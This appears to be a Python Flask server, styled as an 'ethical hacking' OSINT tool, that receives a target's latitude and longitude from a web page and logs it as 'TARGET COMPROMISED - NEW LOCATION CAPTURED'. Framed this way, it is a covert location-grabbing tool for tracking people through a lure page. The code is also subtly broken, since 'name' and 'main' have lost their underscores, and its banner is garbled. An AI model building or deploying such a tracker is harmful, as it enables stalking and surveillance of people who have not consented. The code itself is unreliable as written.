import os
import sys
from flask import Flask, render_template, request, jsonify

app = Flask(name)

# Ethical Hacking Theme Color Codes (ANSI Escape Codes)
GREEN = '\033[92m'
RED = '\033[91m'
CYAN = '\033[96m'
YELLOW = '\033[93m'
BOLD = '\033[1m'
RESET = '\033[0m'

# Function to clear screen and display banner
def show_banner():
    # To clear all previous text from terminal ('clear' for Linux/Termux, 'cls' for Windows)
    os.system('clear' if os.name != 'nt' else 'cls')
    
    banner = f"""{GREEN}{BOLD}
======================================================================
  _ _          _ _     __ _   _  __          __
 |   |   \   /\   / | |/ /  \/  |  | \ | |/  \ \        / /
    | |  | |) | /  \ | |    | ' /| \  / | |  |  \| | |  | \ \  /\  / / 
    | |  |  _  / / /\ \| |    |  < | |\/| |  __| | . ` | |  | |\ \/  \/ /  
    | |  | | \ \/ __ \  . \| |  | |  |\  | || | \  /\  /   
    |_|  |_|  \_\_/    \_\_|_|\_\_|  |_|__|_| \_|\____/   \/  \/    
                                                                           
         {CYAN}[+] Secure OSINT Location Tracking Engine v1.0.2 [+]
======================================================================{RESET}
    """
    print(banner)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/update_location', methods=['POST'])
def update_location():
    try:
        data = request.get_json()
        if not data:
            print(f"{RED}[-] Warning: Empty payload received from target.{RESET}")
            return jsonify({"status": "error", "message": "No data received"}), 400
        
        latitude = data.get('lat')
        longitude = data.get('lon')
        
        # Colorful hacking-style terminal log after receiving live data
        print(f"\n{GREEN}{BOLD}[🎯] TARGET COMPROMISED - NEW LOCATION CAPTURED!{RESET}")
        print(f"    {CYAN}LATITUDE  :{RESET} {YELLOW}{latitude}{RESET}")
        print(f"    {CYAN}LONGITUDE :{RESET} {YELLOW}{longitude}{RESET}")
        print(f"    {CYAN}STATUS    :{RESET} {GREEN}Data successfully intercepted & parsed.{RESET}\n")
        
        return jsonify({"status": "success", "message": "Location updated"}), 200
        
    except Exception as e:
        print(f"{RED}[💥] Critical Error intercepting payload: {e}{RESET}")
        return jsonify({"status": "error", "message": str(e)}), 500

if name == 'main':
    # 1. First, it will clear all previous text on the screen and show the banner at the very top
    show_banner()
    
    cert_path = 'cert.pem'
    key_path = 'key.pem'
    
    # 2. Then, the next steps or server statuses will be printed below the banner
    if os.path.exists(cert_path) and os.path.exists(key_path):
        print(f"{CYAN}[*] Initializing SSL/TLS layer with self-signed certificates...{RESET}")
        print(f"{GREEN}[+] Framework status: ACTIVE and listening for connections...{RESET}\n")
        
        # To keep Flask's default notifications or texts somewhat hidden or clean
        cli = sys.modules['flask.cli']
        cli.show_server_banner = lambda *x: None 
        
        app.run(
            host='0.0.0.0', 
            port=5000, 
            debug=True, 
            ssl_context=(cert_path, key_path)
        )
    else:
        print(f"{RED}{BOLD}[-] CRITICAL FAILURE: SSL certificates Missing!{RESET}")
        print(f"{YELLOW}[!] Deployment Hint: Run './generate_cert.sh' to compile credentials before launching.{RESET}")